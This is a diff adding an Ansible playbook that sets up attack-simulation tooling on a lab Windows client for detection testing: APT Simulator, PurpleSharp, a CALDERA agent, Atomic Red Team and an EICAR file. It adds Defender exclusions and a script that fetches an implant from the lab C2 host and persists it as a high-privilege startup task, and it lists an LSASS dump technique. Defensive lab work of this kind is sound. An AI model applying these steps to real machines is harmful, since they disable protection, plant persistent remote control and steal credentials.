@@ -1,0 +1,159 @@
+---
+# Installs extended attack tooling on win-client1, beyond the curated
+# Atomic Runner schedule. Adds:
+#
+#   1. APT Simulator (Florian Roth) - inert artifacts that look like APT
+#      activity (HOSTS edits, scheduled tasks named like APT toolkits,
+#      registry runners with APT-style names, files dropped in known
+#      malware paths). Generates rich Sysmon/Defender telemetry without
+#      actually being malicious.
+#
+#   2. PurpleSharp - C#/.NET red-team simulation framework. Runs ATT&CK
+#      techniques end-to-end (auth, persist, lateral) with realistic
+#      timing. Compiled binary, no network calls.
+#
+#   3. MITRE CALDERA Sandcat agent - lightweight implant that connects
+#      back to a CALDERA server (we put the server on kali). Real C2
+#      framework, fully contained in the isolated VLAN.
+#
+#   4. Extended Atomic Red Team techniques - 70+ technique IDs (vs the
+#      24 in atomic-schedule.csv), curated for safety.
+#
+#   5. EICAR test file - universal AV/EDR test string. Triggers Defender
+#      detection events on disk-write.
+#
+# IMPORTANT: This playbook runs DURING the bootstrap window (before
+# scripts/lock-down.sh) because several tools need to download archives.
+# After lockdown, nothing here can phone home — all binaries are on
+# disk, all execution is local.
+
+- name: Install extended attack tooling on win-client1
+  hosts: "{{ range_id | default(lookup('env','RANGE_ID')) }}-winclient1"
+  gather_facts: false
+
+  vars:
+    tools_dir:      'C:\AttackTools'
+    quarantine_dir: 'C:\Quarantine'
+    atomics_dir:    'C:\AtomicRedTeam'
+
+  tasks:
+    - name: Create tooling directories
+      ansible.windows.win_file:
+        path: "{{ item }}"
+        state: directory
+      loop:
+        - "{{ tools_dir }}"
+        - "{{ tools_dir }}\\apt-simulator"
+        - "{{ tools_dir }}\\purplesharp"
+        - "{{ tools_dir }}\\caldera"
+        - "{{ quarantine_dir }}"
+
+    - name: Exclude the attack tooling directories from Defender
+      ansible.windows.win_powershell:
+        # We WANT Defender to alert on EICAR-style indicators inside the lab
+        # workload, but if Defender quarantines our tooling itself on disk
+        # the playbook can't run. Exclude the staging dirs, not the executions.
+        script: |
+          Add-MpPreference -ExclusionPath "{{ tools_dir }}"
+          Add-MpPreference -ExclusionPath "{{ quarantine_dir }}"
+
+    # ---- 1. APT Simulator -------------------------------------------------
+    - name: Download APT Simulator (Florian Roth, NextronSystems)
+      ansible.windows.win_get_url:
+        url: https://github.com/NextronSystems/APTSimulator/archive/refs/heads/master.zip
+        dest: "{{ tools_dir }}\\apt-simulator\\src.zip"
+        force: false
+
+    - name: Extract APT Simulator
+      community.windows.win_unzip:
+        src:  "{{ tools_dir }}\\apt-simulator\\src.zip"
+        dest: "{{ tools_dir }}\\apt-simulator"
+        creates: "{{ tools_dir }}\\apt-simulator\\APTSimulator-master"
+
+    - name: Drop convenience launcher for APT Simulator
+      ansible.windows.win_copy:
+        dest: "{{ tools_dir }}\\apt-simulator\\run.bat"
+        content: |
+          @echo off
+          cd /d "{{ tools_dir }}\apt-simulator\APTSimulator-master"
+          REM Mini set: no destruction, no persistent malware
+          call APTSimulator.bat
+        force: true
+
+    # ---- 2. PurpleSharp ---------------------------------------------------
+    - name: Download PurpleSharp release binary
+      ansible.windows.win_get_url:
+        url: https://github.com/mvelazc0/PurpleSharp/releases/download/v1.3/PurpleSharp_x64.exe
+        dest: "{{ tools_dir }}\\purplesharp\\PurpleSharp.exe"
+        force: false
+
+    - name: Drop curated PurpleSharp playbook (safe techniques only)
+      ansible.windows.win_copy:
+        dest: "{{ tools_dir }}\\purplesharp\\safe-techniques.txt"
+        force: true
+        content: |
+          # PurpleSharp simulation IDs, all detection-friendly.
+          # Run:  PurpleSharp.exe sim -p safe-techniques.txt
+          1059.001    # PowerShell
+          1059.003    # cmd
+          1136.001    # local user create
+          1218.011    # rundll32
+          1003.001    # LSASS dump (one-shot, not loop)
+          1546.008    # accessibility features
+          1547.001    # registry run keys
+
+    # ---- 3. MITRE CALDERA Sandcat agent ----------------------------------
+    - name: Drop CALDERA agent installer script
+      # We don't fetch the agent here — it's compiled per CALDERA server
+      # instance. caldera_server_install.sh on kali generates the curl
+      # one-liner. This script wraps it for re-install.
+      ansible.windows.win_copy:
+        dest: "{{ tools_dir }}\\caldera\\install-agent.ps1"
+        force: true
+        content: |
+          # Pulls + installs the Sandcat agent from the CALDERA server
+          # running on the kali box (port 8888).
+          param([string]$server = "http://{{ range_id }}-kali:8888")
+          $url   = "$server/file/download"
+          $hdrs  = @{ "file" = "sandcat.go"; "platform" = "windows" }
+          $agent = "{{ tools_dir }}\caldera\sandcat.exe"
+          Invoke-WebRequest -Uri $url -Headers $hdrs -OutFile $agent -UseBasicParsing
+          # Run as scheduled task so it survives reboots.
+          $action = New-ScheduledTaskAction -Execute $agent `
+            -Argument "-server $server -group red"
+          $trig   = New-ScheduledTaskTrigger -AtStartup
+          Register-ScheduledTask -TaskName "caldera-sandcat" `
+            -Action $action -Trigger $trig -RunLevel Highest -Force
+          Start-ScheduledTask -TaskName "caldera-sandcat"
+
+    # ---- 4. Extended Atomic Red Team techniques --------------------------
+    - name: Copy extended atomic schedule
+      ansible.windows.win_copy:
+        src:  files/atomic-schedule-extended.csv
+        dest: 'C:\AtomicRunner\schedule.csv'
+        force: true
+
+    - name: Restart atomicrunnerservice so the new schedule loads
+      ansible.windows.win_service:
+        name: atomicrunnerservice
+        state: restarted
+      ignore_errors: true   # service may not yet exist on first run
+
+    # ---- 5. EICAR test file ----------------------------------------------
+    - name: Drop EICAR test file (universal AV test string)
+      # NOT in quarantine dir on purpose — we WANT Defender to detect this
+      # so detections appear in Splunk. Defender will quarantine it but
+      # generate an event that the Sysmon TA forwards.
+      ansible.windows.win_powershell:
+        script: |
+          $eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' +
+                   'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+          [System.IO.File]::WriteAllText('C:\Users\Public\Documents\eicar.com', $eicar)
+          Write-Output "EICAR dropped — expect Defender alert + Splunk event"
+
+    - name: Report installed tooling
+      ansible.windows.win_powershell:
+        script: |
+          Get-ChildItem "{{ tools_dir }}" -Recurse -File |
+            Select-Object FullName, Length |
+            Format-Table -AutoSize
